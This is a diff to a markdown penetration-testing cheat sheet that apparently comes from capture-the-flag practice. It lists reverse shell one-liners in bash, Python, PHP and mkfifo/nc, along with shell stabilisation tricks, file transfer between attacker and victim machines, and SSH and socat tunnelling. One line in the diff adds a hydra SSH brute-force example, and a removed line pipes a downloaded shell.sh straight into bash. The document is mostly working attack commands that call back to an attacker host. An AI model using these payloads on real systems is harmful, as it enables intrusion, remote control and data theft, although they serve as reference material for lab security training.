@@ -1,45 +1,41 @@
 
-#### Reverse shell options
-This is a very good [reference](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for reverse shell payloads
+### Reverse shell options
 
-| Condition | Command |
-|---|---|
-| bash / sh | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` |
-| PHP | `php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'` |
-| mkfifo (universal) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc ip port >/tmp/f` |
-| nc listener | `nc -lvnp 4444` |
+| Condition | Action |
+|-----------|--------|
+| **bash / sh** | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` |
+| **Python** | `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
+| **PHP** | `php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'` |
+| **mkfifo (universal)** | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc ip port >/tmp/f` |
+| **nc listener** | `nc -lvnp 4444` |
 
-#### Stabilise / upgrade shell
+---
 
-| Condition | Command |
-|---|---|
-| python pty | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
-| script method | `/usr/bin/script -qc /bin/bash /dev/null` then Ctrl+Z → `stty raw -echo` → `fg` → `export TERM=xterm` |
-| Port tunnelling | `ssh -N -R ATTACKIP:9001:127.0.0.1:9001 user@ATTACKIP` ·|
+### Stabilise / upgrade shell
 
-#### Transfer files between machines
+| Condition | Action |
+|-----------|--------|
+| **python pty** | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
+| **script method** | `/usr/bin/script -qc /bin/bash /dev/null`<br>Ctrl+Z → `stty raw -echo` → `fg` → `export TERM=xterm` |
 
-**Victim → Attacker** (serve from victim, download on attacker)
+---
 
-1. On victim: `python3 -m http.server 8000`
-2. On attacker: `wget http://<victim_ip>:8000/filename`
+### Transfer files between machines
 
-*Wonderland (teaParty binary for RE), Glitch (.firefox profile)*
+| Condition | Action |
+|-----------|--------|
+| **Victim → Attacker** | On victim: `python3 -m http.server 8000`<br>On attacker: `wget http://<victim_ip>:8000/filename` |
+| **Attacker → Victim** | On attacker: `python3 -m http.server 8000`<br>On victim: `curl http://<attacker_ip>:8000/file -o file` |
+| **SCP** | `scp user@$IP:/remote/path ./local/` |
 
-**Attacker → Victim** (serve from attacker, curl/wget on victim)
+---
 
-1. On attacker: `python3 -m http.server 8000`
-2. On victim: `curl http://<attacker_ip>:8000/shell.sh | bash`
+### Reach an internal service (tunnelling / forwarding)
 
-*Chillhack, ContainMe*
+| Condition | Action |
+|-----------|--------|
+| **SSH local (-L)** | Pull internal service to your browser — requires SSH creds<br>`ssh -L <local_port>:<internal_ip>:<remote_port> user@target`<br>*Ref: Internal (Jenkins on 172.17.0.2:8080), Chillhack* |
+| **socat TCP forward** *(new)* | Expose an internal port externally without SSH — useful when you have a shell but no SSH creds yet<br>- Upload socat to victim, then: `./socat TCP-LISTEN:1111,fork TCP:127.0.0.1:22 &`<br>- Now attack `TARGET:1111` as if it were the internal service<br>- Example: `hydra -l fox -P passwords.txt ssh://TARGET -s 1111`<br>*Ref: Year of the Fox (SSH on localhost → forwarded to :1111 → hydra bruteforce)* |
+| **SSH reverse (-R)** | `ssh -N -R ATTACKIP:9001:127.0.0.1:9001 user@ATTACKIP`<br>*Ref: Chillhack* |
+| **-L vs socat vs -R** | Use **-L** when you have SSH creds and want to reach a service the victim can see.<br>Use **socat** when you have a shell but no SSH creds yet — it forwards without auth.<br>Use **-R** when victim needs to call back to expose a port on your side. |
 
-**SCP (if SSH known)**
-
-`scp user@$IP:/remote/path ./local/` · *Basic Pentesting (kay's id_rsa), Agent Sudo (image)*
-
-#### SSH tunnelling (reach internal services)
-
-| Type | Flag | Purpose | Command | When to Use |
-|------|------|---------|---------|-------------|
-| Local Forward | `-L` | Bring an internal service on the victim to your local machine | `ssh -L <local_port>:<internal_ip>:<remote_port> user@target` | When you have SSH creds on victim and want to reach a service only the victim can see (e.g. Jenkins on a Docker subnet `172.17.0.2`) |
-| Reverse Forward | `-R` | Expose your attacker port through victim back to you | `ssh -N -R ATTACKIP:9001:127.0.0.1:9001 user@ATTACKIP` | When you need the victim to call back to expose a port on your side |
